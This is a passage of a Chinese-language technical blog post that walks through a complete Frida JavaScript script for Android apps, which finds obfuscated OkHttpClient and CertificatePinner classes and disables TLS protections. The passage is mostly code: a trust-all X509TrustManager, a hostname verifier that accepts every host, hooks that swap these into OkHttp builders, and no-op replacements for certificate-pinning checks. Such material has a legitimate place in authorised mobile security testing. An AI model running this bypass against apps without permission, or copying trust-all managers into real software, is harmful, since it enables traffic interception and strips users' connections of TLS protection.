function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>尝试在加载的类中查找<strong>OkHttpClient</strong>和<strong>CertificatePinner</strong>这两个类，运行这个脚本，发现通过上面脚本可以成功找到这两个类：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407091035084.png" alt="image.png"> </p><h1 id="0x03-完整代码-详解"><a href="#0x03-完整代码-详解" class="headerlink" title="0x03 完整代码&amp;详解"></a>0x03 完整代码&amp;详解</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> classesNames = <span class="keyword">new</span> <span class="title class_">Array</span>()</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OkhttpClientClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CertificatePinnerClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> prefix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initConsole</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Color</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;01&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;01&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;01&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;11&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;01&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;01&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;01&quot;</span>,  <span class="title class_">Red</span>: <span class="string">&quot;1;01&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LightColor</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;11&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;11&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;11&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;01&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;11&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;11&quot;</span>, <span class="title class_">Red</span>: <span class="string">&quot;1;11&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;11&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> colorPrefix = <span class="string">&#x27;\x1b[3&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> colorSuffix = <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Color</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (c  == <span class="string">&quot;RESET&quot;</span>) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="variable language_">console</span>[c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">Color</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&quot;Light&quot;</span> + c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">LightColor</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadOkhttpClient</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;okhttp3.OkHttpClient&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">            <span class="comment">//console.error(e)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadClasses</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">clsName, handle</span>)&#123;</span><br><span class="line">                classesNames.<span class="title function_">push</span>(clsName)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Green</span>(<span class="string">&quot;Search Class Completed!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findOkhttpClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isOkhttpClient</span>(<span class="params">clsName</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">                <span class="keyword">var</span> interfaces = cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>()</span><br><span class="line">                <span class="keyword">const</span> count = interfaces.<span class="property">length</span></span><br><span class="line">                <span class="keyword">if</span>(count &lt; <span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> interface_ = interfaces[i]</span><br><span class="line">                    <span class="keyword">var</span> interface_name = interface_.<span class="title function_">getName</span>()</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;Cloneable&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        flag = <span class="literal">true</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&#x27;java.lang.Object&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isCertificatePinner</span>(<span class="params">clsName,prefix</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(!clsName.<span class="title function_">startsWith</span>(prefix))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>().<span class="property">length</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&quot;java.lang.Object&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title class_">Modifier</span>.<span class="title function_">isFinal</span>(cls.<span class="property">class</span>.<span class="title function_">getModifiers</span>()))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> methods = cls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> method = methods[i]</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>() == <span class="string">&quot;java.security.cert.Certificate&quot;</span>)&#123;</span><br><span class="line">                    flag = <span class="literal">true</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">            flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> fields = cls.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>()</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; fields.<span class="property">length</span>; k++)&#123;</span><br><span class="line">                <span class="keyword">var</span> field = fields[k];</span><br><span class="line">                <span class="keyword">if</span>(field.<span class="title function_">getType</span>().<span class="title function_">getName</span>() == <span class="string">&quot;java.util.Set&quot;</span>)&#123;</span><br><span class="line">                    flag = <span class="literal">true</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isOkhttpClient</span>(classesNames[i]))&#123;</span><br><span class="line">                <span class="title class_">OkhttpClientClassName</span> = classesNames[i]</span><br><span class="line">                <span class="keyword">var</span> prefix = classesNames[i].<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]+<span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isCertificatePinner</span>(classesNames[i],prefix))&#123;</span><br><span class="line">                <span class="title class_">CertificatePinnerClassName</span> = classesNames[i]</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> printOut</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">OkhttpClientClassName</span> == <span class="string">&quot;&quot;</span> || <span class="title class_">CertificatePinnerClassName</span> == <span class="string">&quot;&quot;</span> || prefix == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Red</span></span><br><span class="line">            <span class="title function_">printOut</span>(<span class="string">&quot;Can&#x27;t find the okhttp class&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Green</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found Class: &quot;</span>+classesNames.<span class="property">length</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Okhttp&#x27;s package prefix: &quot;</span>+prefix)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpClient: &quot;</span>+<span class="title class_">OkhttpClientClassName</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpCertificatePinner: &quot;</span>+<span class="title class_">CertificatePinnerClassName</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)</span><br><span class="line">        <span class="comment">//TrustAllManager</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustAllManagerClass</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;TrustAllManager&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.X509TrustManager&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">checkClientTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkClientTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">checkServerTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkServerTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">getAcceptedIssuers</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> [];</span><br><span class="line">                &#125;,</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> trustAllManagerHandle = <span class="title class_">TrustAllManagerClass</span>.$new()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sslContext = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.SSLContext&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;TLS&quot;</span>)</span><br><span class="line">        sslContext.<span class="title function_">init</span>(<span class="literal">null</span>,<span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;Ljavax.net.ssl.X509TrustManager;&quot;</span>,[trustAllManagerHandle]),<span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">var</span> sslSocketFactory = sslContext.<span class="title function_">getSocketFactory</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment">//HostnameVerify</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">MyHostnameVerify</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;MyHostnameVerify&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">verify</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(hostname)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> myHostnameVerifyHandle = <span class="title class_">MyHostnameVerify</span>.$new()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> internalOkhttpClientClasses = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">OkhttpClientClassName</span>).<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>()</span><br><span class="line">        internalOkhttpClientClasses.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">internalClass</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> methods = internalClass.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">            methods.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>) &#123;</span><br><span class="line">                 <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> firstParameterTypeName = method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.SSLSocketFactory&quot;</span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> sslSocketFacotryMethodName  = method.<span class="title function_">getName</span>()</span><br><span class="line">                    <span class="title class_">Builder</span>[sslSocketFacotryMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">SSLSocketFactory</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = sslSocketFactory</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[sslSocketFacotryMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Blue</span>(sslSocketFacotryMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> hostnameVerifierMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                    <span class="title class_">Builder</span>[hostnameVerifierMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostnameVerifier</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = myHostnameVerifyHandle</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[hostnameVerifierMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Yellow</span>(hostnameVerifierMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="title class_">CertificatePinnerClassName</span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> certificatePinnerMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line"></span><br><span class="line">                    <span class="title class_">Builder</span>[certificatePinnerMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">certificatePinner</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">retain</span>(<span class="variable language_">this</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Purple</span>(certificatePinnerMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificatePinnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">CertificatePinnerClassName</span>)</span><br><span class="line">        <span class="keyword">var</span> methods = <span class="title class_">CertificatePinnerClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">        methods.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">method</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(method.<span class="title function_">getReturnType</span>().<span class="title function_">getName</span>() == <span class="string">&#x27;void&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> methodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(methodName+<span class="string">&quot; Hooked!&quot;</span>)</span><br><span class="line">                <span class="title class_">CertificatePinnerClass</span>[methodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">overload</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(overload.<span class="property">returnType</span>.<span class="property">name</span> == <span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;certificatePinner check called!&quot;</span>)</span><br><span class="line">                        &#125;   </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">initConsole</span>()</span><br><span class="line">    <span class="title function_">loadOkhttpClient</span>()</span><br><span class="line">    <span class="title function_">loadClasses</span>()</span><br><span class="line">    <span class="title function_">findOkhttpClass</span>()</span><br><span class="line">    <span class="title function_">hook</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h2 id="initConsole-可选"><a href="#initConsole-可选" class="headerlink" title="initConsole()-可选"></a>initConsole()-可选</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initConsole</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Color</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;01&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;01&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;01&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;11&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;01&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;01&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;01&quot;</span>,  <span class="title class_">Red</span>: <span class="string">&quot;1;01&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LightColor</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;11&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;11&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;11&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;01&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;11&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;11&quot;</span>, <span class="title class_">Red</span>: <span class="string">&quot;1;11&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;11&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> colorPrefix = <span class="string">&#x27;\x1b[3&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> colorSuffix = <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Color</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (c  == <span class="string">&quot;RESET&quot;</span>) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="variable language_">console</span>[c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">Color</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&quot;Light&quot;</span> + c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">LightColor</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span 